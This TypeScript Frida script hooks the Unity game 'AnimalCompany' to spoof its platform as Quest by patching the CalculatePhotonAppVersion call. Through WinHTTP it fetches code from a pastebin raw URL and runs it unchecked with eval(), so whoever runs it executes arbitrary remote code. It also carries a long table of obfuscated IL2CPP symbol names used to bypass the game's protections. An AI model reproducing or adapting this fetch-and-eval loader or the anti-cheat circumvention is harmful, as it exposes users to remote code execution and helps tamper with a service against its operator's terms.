// @ts-nocheck
declare const ptr: any;
declare const Interceptor: any;
declare const Module: any;
declare const Memory: any;
declare const NativeFunction: any;
declare const Script: any;

const QUEST_PLATFORM = 1;
const SYMBOLS_URL = "https://pastebin.com/raw/0da0c4sr";

function parseUrl(url: string): {
  hostname: string;
  path: string;
  port: number;
} {
  const match = url.match(/^https?:\/\/([^/:]+)(?::(\d+))?(.*)$/);
  if (!match) {
    return { hostname: "", path: "/", port: 443 };
  }
  const hostname = match[1];
  const port = match[2]
    ? parseInt(match[2])
    : url.startsWith("https")
      ? 443 // made by byte
      : 80;
  const path = match[3] || "/";
  return { hostname, path, port };
}

function httpRequest(
  url: string,
  method: string,
  headers: any,
  body?: string, // made by byte
): Promise<{ status: number; data: string }> {
  return new Promise((resolve) => {
    try {
      const winhttp = Module.load("winhttp.dll");

      const WinHttpOpen = new NativeFunction(
        winhttp.getExportByName("WinHttpOpen"),
        "pointer",
        ["pointer", "uint32", "pointer", "pointer", "uint32"],
      );

      const WinHttpConnect = new NativeFunction(
        winhttp.getExportByName("WinHttpConnect"),
        "pointer",
        ["pointer", "pointer", "uint32", "uint32"],
      ); // made by byte

      const WinHttpOpenRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpOpenRequest"),
        "pointer",
        [
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "pointer",
          "uint32",
        ],
      );

      const WinHttpSendRequest = new NativeFunction(
        winhttp.getExportByName("WinHttpSendRequest"),
        "bool",
        [
          "pointer",
          "pointer", // made by byte
          "uint32",
          "pointer",
          "uint32",
          "uint32",
          "pointer",
        ],
      );

      const WinHttpReceiveResponse = new NativeFunction(
        winhttp.getExportByName("WinHttpReceiveResponse"),
        "bool",
        ["pointer", "pointer"],
      );

      const WinHttpQueryHeaders = new NativeFunction(
        winhttp.getExportByName("WinHttpQueryHeaders"), // made by byte
        "bool",
        ["pointer", "uint32", "pointer", "pointer", "pointer", "pointer"],
      );

      const WinHttpReadData = new NativeFunction( // made by byte
        winhttp.getExportByName("WinHttpReadData"),
        "bool",
        ["pointer", "pointer", "uint32", "pointer"],
      );

      const WinHttpCloseHandle = new NativeFunction(
        winhttp.getExportByName("WinHttpCloseHandle"), // made by byte
        "bool",
        ["pointer"],
      );

      const WinHttpSetOption = new NativeFunction(
        winhttp.getExportByName("WinHttpSetOption"),
        "bool",
        ["pointer", "uint32", "pointer", "uint32"],
      );

      const WinHttpSetTimeouts = new NativeFunction(
        winhttp.getExportByName("WinHttpSetTimeouts"),
        "bool",
        ["pointer", "int32", "int32", "int32", "int32"],
      );

      const GetLastError = new NativeFunction(
        Module.load("kernel32.dll").getExportByName("GetLastError"),
        "uint32",
        [],
      );

      const urlParts = parseUrl(url);
      const hostname = urlParts.hostname;
      const path = urlParts.path;
      const port = urlParts.port;

      const userAgent = Memory.allocUtf16String(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      );
      const hSession = WinHttpOpen(userAgent, 0, ptr(0), ptr(0), 0);

      if (hSession.isNull()) {
        resolve({
          status: 0,
          data: "WinHttpOpen failed (" + GetLastError() + ")",
        });
        return;
      }

      WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

      const hostnameW = Memory.allocUtf16String(hostname);
      const hConnect = WinHttpConnect(hSession, hostnameW, port, 0);

      if (hConnect.isNull()) {
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpConnect failed" });
        return;
      }

      const pathW = Memory.allocUtf16String(path);
      const methodW = Memory.allocUtf16String(method);
      const hRequest = WinHttpOpenRequest(
        hConnect,
        methodW,
        pathW,
        ptr(0),
        ptr(0),
        ptr(0),
        url.startsWith("https") ? 0x00800000 : 0,
      );

      if (hRequest.isNull()) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpOpenRequest failed" });
        return;
      }

      const flagsBuf = Memory.alloc(4);
      flagsBuf.writeU32(0x00000100 | 0x00000200 | 0x00001000 | 0x00002000);
      WinHttpSetOption(hRequest, 31, flagsBuf, 4);

      let headersStr = "";
      for (const key in headers) {
        headersStr += key + ": " + headers[key] + "\r\n";
      }
      const headersW = Memory.allocUtf16String(headersStr);

      const bodyPtr = body ? Memory.allocUtf8String(body) : ptr(0);
      const bodyLen = body ? body.length : 0;

      if (
        !WinHttpSendRequest(
          hRequest,
          headersW,
          -1,
          bodyPtr,
          bodyLen,
          bodyLen,
          ptr(0),
        )
      ) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({ status: 0, data: "WinHttpSendRequest failed (" + err + ")" });
        return;
      }

      if (!WinHttpReceiveResponse(hRequest, ptr(0))) {
        const err = GetLastError();
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        resolve({
          status: 0,
          data: "WinHttpReceiveResponse failed (" + err + ")",
        });
        return;
      }

      const statusBuffer = Memory.alloc(4);
      const statusSize = Memory.alloc(4);
      statusSize.writeU32(4);

      WinHttpQueryHeaders(
        hRequest,
        0x20000013,
        ptr(0),
        statusBuffer,
        statusSize,
        ptr(0),
      );
      const statusCode = statusBuffer.readU32();

      const buffer = Memory.alloc(8192);
      const bytesRead = Memory.alloc(4);
      let responseData = "";

      while (WinHttpReadData(hRequest, buffer, 8192, bytesRead)) {
        const size = bytesRead.readU32();
        if (size === 0) break;
        responseData += buffer.readUtf8String(size);
      }

      WinHttpCloseHandle(hRequest);
      WinHttpCloseHandle(hConnect);
      WinHttpCloseHandle(hSession);

      resolve({ status: statusCode, data: responseData });
    } catch (e) {
      console.log("[-] HTTP request error: " + e);
      resolve({ status: 0, data: "Error: " + e });
    }
  });
}

async function loadQuestServers() {
  console.log("\n");
  console.log("------------------------------");
  console.log("[+] Connected to Quest Servers");
  console.log("[+] Made ItzDaTree");
  console.log("------------------------------");

  const symResponse = await httpRequest(SYMBOLS_URL, "GET", {});
  if (symResponse.status === 200) {
    try {
      eval(symResponse.data);

const mapping: any = {
  il2cpp_init: "NsKroxVXJyJ",
  il2cpp_init_utf16: "EEPOnlnAMUS",
  il2cpp_shutdown: "jI_OjCIUcrv",
  il2cpp_set_config_dir: "erdXLHKdLHv",
  il2cpp_set_data_dir: "ImvPoWXGFcc",
  il2cpp_set_temp_dir: "bMAA_FmbbAa",
  il2cpp_set_commandline_arguments: "DYjlmuINxOT",
  il2cpp_set_commandline_arguments_utf16: "jqVATcHfHEo",
  il2cpp_set_config_utf16: "VgOresMZyax",
  il2cpp_set_config: "Ev_hbmfCJuJ",
  il2cpp_set_memory_callbacks: "TsgFhDDqMvo",
  il2cpp_memory_pool_set_region_size: "iiEWoYJdsrn",
  il2cpp_memory_pool_get_region_size: "CdLyQvOffQP",
  il2cpp_get_corlib: "BSMLBkBlbdr",
  il2cpp_add_internal_call: "dc_yftJlhai",
  il2cpp_resolve_icall: "DOPVGkEVJLB",
  il2cpp_alloc: "fgbscZnFjn_",
  il2cpp_free: "kYvpFaBuSSr",
  il2cpp_array_class_get: "bRtaoprWIuK",
  il2cpp_array_length: "OlbAurybUKD",
  il2cpp_array_get_byte_length: "OCCtPnsYdps",
  il2cpp_array_new: "hrLM_IvgOte",
  il2cpp_array_new_specific: "BeVVwCYDrGG",
  il2cpp_array_new_full: "lVdlMIWatTz",
  il2cpp_bounded_array_class_get: "_VxdLUKszRX",
  il2cpp_array_element_size: "mFeCoOjHUSV",
  il2cpp_assembly_get_image: "feIXnTwqzBz",
  il2cpp_class_for_each: "CeANdupCCHE",
  il2cpp_class_enum_basetype: "wXUWiCcZhu_",
  il2cpp_class_is_inited: "iltJJToBiTI",
  il2cpp_class_is_generic: "snTNoqWORJI",
  il2cpp_class_is_inflated: "jzVXEbhhOap",
  il2cpp_class_is_assignable_from: "ImfcPMDGVuk",
  il2cpp_class_is_subclass_of: "lciVwOpqRmU",
  il2cpp_class_has_parent: "JJSmOrnjamw",
  il2cpp_class_from_il2cpp_type: "BqKHDkLEYfw",
  il2cpp_class_from_name: "LiJeoPrSKyC",
  il2cpp_class_from_system_type: "XokBZwLodnO",
  il2cpp_class_get_element_class: "PsjBxzBGIaV",
  il2cpp_class_get_events: "qcknAkudwzU",
  il2cpp_class_get_fields: "xREe_VIZGdk",
  il2cpp_class_get_nested_types: "ZzbCLNeUuhe",
  il2cpp_class_get_interfaces: "XbbHJIwNiep",
  il2cpp_class_get_properties: "OwVLajWbzJY",
  il2cpp_class_get_property_from_name: "zVWprQsqZji",
  il2cpp_class_get_field_from_name: "YiGztoLGJP_",
  il2cpp_class_get_methods: "PkojbBAsMpS",
  il2cpp_class_get_method_from_name: "U_nzyhZHbaG",
  il2cpp_class_get_name: "NWBnBHGNIvc",
  il2cpp_type_get_name_chunked: "hMjGKuCYsze",
  il2cpp_class_get_namespace: "fiwaMkPZoZu",
  il2cpp_class_get_parent: "wQEPLaOPEWg",
  il2cpp_class_get_declaring_type: "PWafYtTtsQH",
  il2cpp_class_instance_size: "WqRuBathrtN",
  il2cpp_class_num_fields: "vcbkJFqCiog",
  il2cpp_class_is_valuetype: "lNIAiwHQAZU",
  il2cpp_class_value_size: "NtzZSgoVxiM",
  il2cpp_class_is_blittable: "jcFtAhioosh",
  il2cpp_class_get_flags: "iiLyWkRCAwn",
  il2cpp_class_is_abstract: "GrLAOYnIlpf",
  il2cpp_class_is_interface: "XcBvsejEnkr",
  il2cpp_class_array_element_size: "KVqRYuFTGRz",
  il2cpp_class_from_type: "GrjtGBEzrfB",
  il2cpp_class_get_type: "NimxgbvZNqJ",
  il2cpp_class_get_type_token: "_OfCEQSEHeW",
  il2cpp_class_has_attribute: "tNTmso_pjUe",
  il2cpp_class_has_references: "XEEgnpddOoi",
  il2cpp_class_is_enum: "EKCOco_XPtn",
  il2cpp_class_get_image: "PZwYgbWoxpY",
  il2cpp_class_get_assemblyname: "AFtdWVmjSnz",
  il2cpp_class_get_rank: "kbETODEXzbY",
  il2cpp_class_get_data_size: "CbcbtnGHafU",
  il2cpp_class_get_static_field_data: "BPInXBlCeU_",
  il2cpp_stats_dump_to_file: "bUkcaJQKiTF",
  il2cpp_stats_get_value: "BIjnEaWlTwD",
  il2cpp_domain_get: "MnJtFWTyDYS",
  il2cpp_domain_assembly_open: "xvkEXsClZJj",
  il2cpp_domain_get_assemblies: "za_uNluUqRd",
  il2cpp_raise_exception: "FCNBMoVvbfR",
  il2cpp_exception_from_name_msg: "riaXrxOkEAz",
  il2cpp_get_exception_argument_null: "DxaBvwvHd_i",
  il2cpp_format_exception: "RvSSGyVRMPc",
  il2cpp_format_stack_trace: "GCnzxJGXaAJ",
  il2cpp_unhandled_exception: "LptJDJEIzLd",
  il2cpp_native_stack_trace: "z_LjYKkeaSl",
  il2cpp_field_get_flags: "PyCwMjrlooF",
  il2cpp_field_get_from_reflection: "tAKBCLlmJFN",
  il2cpp_field_get_name: "NdaxdAfxpah",
  il2cpp_field_get_parent: "yN_PqqbOIsb",
  il2cpp_field_get_object: "vGJrij_KNzN",
  il2cpp_field_get_offset: "bXhPMtBVkdQ",
  il2cpp_field_get_type: "hQPdFnkyGdG",
  il2cpp_field_get_value: "JStStvWdeoC",
  il2cpp_field_get_value_object: "nOdSXiXQAKt",
  il2cpp_field_has_attribute: "lvDfvQeWWSj",
  il2cpp_field_set_value: "SJFbPxDHzvf",
  il2cpp_field_static_get_value: "yOOEUoTJyDP",
  il2cpp_field_static_set_value: "ISXWimcebxr",
  il2cpp_field_set_value_object: "KGtLuZmfuTx",
  il2cpp_field_is_literal: "PtpGWvvvTJr",
  il2cpp_gc_collect: "jfIVyQZLtnk",
  il2cpp_gc_collect_a_little: "BYycnJGZOgg",
  il2cpp_gc_start_incremental_collection: "rcYhJhRGqFy",
  il2cpp_gc_disable: "EnnUGmy_xQj",
  il2cpp_gc_enable: "utzcQlwlTSE",
  il2cpp_gc_is_disabled: "jVvz_HsIDuD",
  il2cpp_gc_set_mode: "Zznmtaf_OHy",
  il2cpp_gc_get_max_time_slice_ns: "fpucUYefwuP",
  il2cpp_gc_set_max_time_slice_ns: "R_tQvBvJBMk",
  il2cpp_gc_is_incremental: "mSmgjlTjnNh",
  il2cpp_gc_get_used_size: "guGktpXjTbq",
  il2cpp_gc_get_heap_size: "snOslofStjU",
  il2cpp_gc_wbarrier_set_field: "fGhpItqUnau",
  il2cpp_gc_has_strict_wbarriers: "qByBkyWEpUh",
  il2cpp_gc_set_external_allocation_tracker: "OSRlrkpcyeP",
  il2cpp_gc_set_external_wbarrier_tracker: "xgSUGIWQRcm",
  il2cpp_gc_foreach_heap: "WLeTJuPooux",
  il2cpp_stop_gc_world: "KeScRyZafQf",
  il2cpp_start_gc_world: "HdGyhFuJpxA",
  il2cpp_gc_alloc_fixed: "CfPSuZgifdK",
  il2cpp_gc_free_fixed: "UbTnvJEIpDc",
  il2cpp_gchandle_new: "jRpabEjTP__",
  il2cpp_gchandle_new_weakref: "gIapCKJB_ZG",
  il2cpp_gchandle_get_target: "_fXBMoWMsUs",
  il2cpp_gchandle_free: "WqaNhr_TfYF",
  il2cpp_gchandle_foreach_get_target: "zutfxrezDXJ",
  il2cpp_object_header_size: "oCURO_eoHxa",
  il2cpp_array_object_header_size: "vgrBCoOSVQa",
  il2cpp_offset_of_array_length_in_array_object_header: "ZSBLUtFsLXm",
  il2cpp_offset_of_array_bounds_in_array_object_header: "OqqhAxtozor",
  il2cpp_allocation_granularity: "qCkKHkIcjSH",
  il2cpp_unity_liveness_allocate_struct: "__doQQaVZHL",
  il2cpp_unity_liveness_calculation_from_root: "qzYLMOoVLTd",
  il2cpp_unity_liveness_calculation_from_statics: "xjQKYzFMTTM",
  il2cpp_unity_liveness_finalize: "lWEEVOIOWYp",
  il2cpp_unity_liveness_free_struct: "keTEgaBRVGg",
  il2cpp_method_get_return_type: "PAsGhfESZjl",
  il2cpp_method_get_declaring_type: "MrNxZFZkUIl",
  il2cpp_method_get_name: "kqXEXCufJAw",
  il2cpp_method_get_from_reflection: "jZoRNkYHjcS",
  il2cpp_method_get_object: "jLUycLTRKVE",
  il2cpp_method_is_generic: "JWWpQXCddYq",
  il2cpp_method_is_inflated: "VoQzNTQGrkA",
  il2cpp_method_is_instance: "jJTpIybIYGb",
  il2cpp_method_get_param_count: "FjmhLELQmcV",
  il2cpp_method_get_param: "mchxsttDb_l",
  il2cpp_method_get_class: "My_QKqcqxFN",
  il2cpp_method_has_attribute: "JebwyrQsAPZ",
  il2cpp_method_get_flags: "fMBLzWESsHd",
  il2cpp_method_get_token: "UFfUkpwR_hZ",
  il2cpp_method_get_param_name: "wVVSAvreNpW",
  il2cpp_property_get_flags: "xOjgRlHbolW",
  il2cpp_property_get_get_method: "erVtVZEQoXi",
  il2cpp_property_get_set_method: "TAcaA_HNKHv",
  il2cpp_property_get_name: "tSgeJgjyAei",
  il2cpp_property_get_parent: "WlWmSpyCXlI",
  il2cpp_object_get_class: "NaBtGuwZlNj",
  il2cpp_object_get_size: "VXmWYuzIcBx",
  il2cpp_object_get_virtual_method: "OfNGdKXzoDo",
  il2cpp_object_new: "HURBOaHbJHk",
  il2cpp_object_unbox: "DOcLmdteuqI",
  il2cpp_value_box: "hkuvVdUOwLz",
  il2cpp_monitor_enter: "UemtSoMgrhN",
  il2cpp_monitor_try_enter: "XitFJGRjxfU",
  il2cpp_monitor_exit: "TJuJJAMvYvj",
  il2cpp_monitor_pulse: "fDYuAdEIzpr",
  il2cpp_monitor_pulse_all: "vlkwNxvhrvM",
  il2cpp_monitor_wait: "vwhVEAWsYnC",
  il2cpp_monitor_try_wait: "zhoeHeViv_B",
  il2cpp_runtime_invoke: "IJENMcKRclX",
  il2cpp_runtime_invoke_convert_args: "HOVOYjKxMlh",
  il2cpp_runtime_class_init: "KEbHJzNSqxo",
  il2cpp_runtime_object_init: "ssrcwdDkJZm",
  il2cpp_runtime_object_init_exception: "ATewcipKtZA",
  il2cpp_runtime_unhandled_exception_policy_set: "rCIZpnKKPyO",
  il2cpp_string_length: "YMlQlPbQsdh",
  il2cpp_string_chars: "YbIMePFUQQU",
  il2cpp_string_new: "XlijzcIWwwU",
  il2cpp_string_new_len: "UuEfLS_BpOu",
  il2cpp_string_new_utf16: "wQIWTIvtnp_",
  il2cpp_string_new_wrapper: "IfmQzkYMMrk",
  il2cpp_string_intern: "VzUwwdKjGLr",
  il2cpp_string_is_interned: "eal_xClvaeG",
  il2cpp_thread_current: "OHNbLAKTleK",
  il2cpp_thread_attach: "oEY_AHDdCtD",
  il2cpp_thread_detach: "AHzRUvGMqVB",
  il2cpp_is_vm_thread: "QSgoTeZEeAI",
  il2cpp_current_thread_walk_frame_stack: "SCeVKxvOXIT",
  il2cpp_thread_walk_frame_stack: "BxrNanMkgcH",
  il2cpp_current_thread_get_top_frame: "rkzSdShjvpR",
  il2cpp_thread_get_top_frame: "hRPGzLoNgNw",
  il2cpp_current_thread_get_frame_at: "MLeMCuQTwDR",
  il2cpp_thread_get_frame_at: "aOGpMmYvAyF",
  il2cpp_current_thread_get_stack_depth: "ltMGiGVfzOO",
  il2cpp_thread_get_stack_depth: "xfKH_OIHoOw",
  il2cpp_override_stack_backtrace: "qrquxiFlGhO",
  il2cpp_type_get_object: "TIzUYtYGAXF",
  il2cpp_type_get_type: "mochdIQGT_v",
  il2cpp_type_get_class_or_element_class: "fLjXEpgaq_G",
  il2cpp_type_get_name: "ELNGXUcQvqt",
  il2cpp_type_is_byref: "LcgXckYRXJX",
  il2cpp_type_get_attrs: "luekVhctqzW",
  il2cpp_type_equals: "QBHjHCuctgF",
  il2cpp_type_get_assembly_qualified_name: "RKgnzf_RsWO",
  il2cpp_type_get_reflection_name: "GkqMOTQHTJJ",
  il2cpp_type_is_static: "ujylgdIIcbz",
  il2cpp_type_is_pointer_type: "iVPPRfxOOmg",
  il2cpp_image_get_assembly: "FychTkenmPr",
  il2cpp_image_get_name: "GWcqGHDxzgt",
  il2cpp_image_get_filename: "gRwQN_CvpLw",
  il2cpp_image_get_entry_point: "ymStYwISMJE",
  il2cpp_image_get_class_count: "qSHbyBTehws",
  il2cpp_image_get_class: "mwWIWmeFNab",
  il2cpp_capture_memory_snapshot: "iVVFeXbbyaX",
  il2cpp_free_captured_memory_snapshot: "ISxpLbUlDXS",
  il2cpp_set_find_plugin_callback: "wLfsdubmpyQ",
  il2cpp_register_log_callback: "fxZKCLneDWj",
  il2cpp_debugger_set_agent_options: "IcdOCnlXIlg",
  il2cpp_is_debugger_attached: "z_NA_yFTxyF",
  il2cpp_register_debugger_agent_transport: "SoNrnDZhHyr",
  il2cpp_debug_foreach_method: "tnPTDrjJtqT",
  il2cpp_debug_get_method_info: "bDArgXLHGsn",
  il2cpp_unity_install_unitytls_interface: "Ml_zYJUOeon",
  il2cpp_custom_attrs_from_class: "cMoxUaWtELb",
  il2cpp_custom_attrs_from_method: "HCjMgTPwFPQ",
  il2cpp_custom_attrs_from_field: "VeYaOBoSBLi",
  il2cpp_custom_attrs_get_attr: "b_rsYAmTQhy",
  il2cpp_custom_attrs_has_attr: "cKHhvzdJaWz",
  il2cpp_custom_attrs_construct: "KBaOrBtMeBa",
  il2cpp_custom_attrs_free: "ftSBMVAzxgm",
  il2cpp_class_set_userdata: "yguIuWee_Zg",
  il2cpp_class_get_userdata_offset: "Qsd_RESvUHM",
  il2cpp_set_default_thread_affinity: "EVMXUubZlpm",
  il2cpp_unity_set_android_network_up_state_func: "satIcvgnlpP",
};

      const symbols = (Il2Cpp as any).$config.exports;
      if (symbols) {
        for (const key in symbols) {
          if (mapping[key]) {
            symbols[mapping[key]] = symbols[key];
          }
        }
      }

  Il2Cpp.perform(() => {
    const findClass = (n: string) => {
      for (const a of Il2Cpp.domain.assemblies) {
        try {
          const k = a.image.tryClass(n);
          if (k) return k;
        } catch (_) {}
      }
      return null;
    };

    const AppUtils = findClass("AnimalCompany.AppUtils");
    if (!AppUtils) {
      console.log("[-] AppUtils not found");
      return;
    }

    let method: any = null;
    for (const m of AppUtils.methods) {
      if (
        /CalculatePhotonAppVersion/i.test(m.name) &&
        (m.returnType?.name || "") === "System.String"
      ) {
        method = m;
        break;
      }
    }

    if (!method) {
      console.log("[-] CalculatePhotonAppVersion not found");
      return;
    }

    Interceptor.attach(method.virtualAddress, {
      onEnter(args: any) {
        try {
          args[2] = ptr(QUEST_PLATFORM);
        } catch (_) {}
      },
    });
  });
    } catch (e) {
      console.log("[-] Error: " + e);
    }
  }
}

loadQuestServers();
